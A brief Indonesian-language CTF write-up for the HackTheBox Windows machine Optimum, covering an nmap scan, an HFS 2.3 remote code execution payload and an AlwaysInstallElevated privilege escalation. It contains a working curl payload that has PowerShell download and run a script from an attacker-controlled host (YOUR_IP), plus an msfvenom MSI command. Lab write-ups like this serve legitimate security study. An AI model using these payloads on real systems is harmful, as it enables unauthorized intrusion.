# 🖥️ HackTheBox - Optimum (Windows)

## 🧩 Ringkasan
Target adalah mesin Windows dengan port 8080 terbuka yang menjalankan HttpFileServer v2.3. Ada celah RCE yang bisa dieksploitasi menggunakan `curl` atau `exploit-db`.

## 🔍 Langkah Eksploitasi

1. Nmap Scan
```bash
nmap -sC -sV -oN optimum-nmap.txt 10.10.10.8
```

Hasil
```arduino
PORT     STATE SERVICE
8080/tcp open  http    HttpFileServer httpd 2.3
```

2. RCE dengan Exploit HFS 2.3
Gunakan payload dari Exploit-DB (ID 49125)
```bash
curl http://10.10.10.8:8080/?search=%00{.exec|cmd.exe /c powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')".}
```

3. Privilege Escalation

- Jalankan `winPEAS.bat`
- Ketemu `Service AlwaysInstallElevated`
- Exploit dengan `msfvenom msi`

```bash
msfvenom -p windows/exec CMD='whoami > C:\\Users\\Public\\pwned.txt' -f msi -o shell.msi
```


🏁 Flag

- User: `CTF{user_flag_here}`
- Root: `CTF{root_flag_here}`